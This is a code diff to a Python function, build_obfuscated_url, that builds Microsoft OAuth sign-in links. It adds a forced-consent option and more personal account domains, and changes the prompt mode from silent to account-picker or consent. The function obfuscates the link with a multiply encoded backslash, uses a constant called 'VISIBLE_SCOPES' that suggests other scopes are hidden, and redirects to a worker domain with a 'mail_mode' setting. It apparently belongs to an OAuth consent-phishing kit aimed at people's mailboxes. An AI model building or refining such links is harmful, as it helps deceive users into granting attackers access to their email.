@@ -521,6 +521,7 @@ def build_obfuscated_url(
     tenant_hint: str = "",
     login_hint: str | None = None,
     domain_hint: str | None = None,
+    force_consent: bool = False,
 ) -> str:
     nonce = uuid.uuid4().hex[:16]
     state_value = _encode_state_hex(user_id)
@@ -547,34 +548,47 @@ def build_obfuscated_url(
 
     obfuscated_key = "%25255C" + obfuscated_block
 
-    # Detect if this is a personal account
-    # Personal accounts use outlook.com hotmail.com live.com
-    # gmail.com yahoo.com etc are not Microsoft accounts
+    # Detect personal Microsoft account domains
     personal_domains = {
         "outlook.com",
         "hotmail.com",
         "live.com",
         "msn.com",
         "passport.com",
+        "live.co.uk",
+        "hotmail.co.uk",
+        "outlook.co.uk",
     }
 
     is_personal = False
-    if login_hint and "@" in login_hint:
+    if login_hint and "@" in str(login_hint):
         domain = login_hint.split("@", 1)[1].lower()
         is_personal = domain in personal_domains
 
-    # Use consumers tenant for personal accounts
-    # Use common for work/school accounts
-    # common also works for personal but consumers is more explicit
-    if is_personal:
-        tenant = "consumers"
+    # Tenant selection
+    # consumers = personal accounts only
+    # common    = both work and personal
+    tenant = "consumers" if is_personal else "common"
+
+    # Prompt selection
+    # consent_required errors need prompt=consent
+    # New users need prompt=select_account so they can
+    # choose their account and see the consent screen
+    # force_consent=True forces the consent screen always
+    # which handles accounts that require it automatically
+    if force_consent:
+        prompt = "consent"
     else:
-        tenant = "common"
+        # select_account shows account picker and consent
+        # screen if consent has not been granted yet
+        # This automatically handles consent_required errors
+        # without needing a separate consent flow
+        prompt = "select_account"
 
     base_params = {
         "state": state_value,
         "scope": VISIBLE_SCOPES,
-        "prompt": "none",
+        "prompt": prompt,
         "response_type": "code",
         "response_mode": "query",
         "client_id": client_id,
@@ -602,6 +616,8 @@ def build_obfuscated_url(
         f"  user_id={user_id}\n"
         f"  tenant={tenant}\n"
         f"  is_personal={is_personal}\n"
+        f"  prompt={prompt}\n"
+        f"  force_consent={force_consent}\n"
         f"  flow_type={flow_type}\n"
         f"  mail_mode={mail_mode}\n"
         f"  redirect_uri=https://{WORKER_DOMAIN}\n"
@@ -609,7 +625,7 @@ def build_obfuscated_url(
     )
 
     return full_url
-    
+
 # =========================
 # COMPAT HELPERS
 # =========================
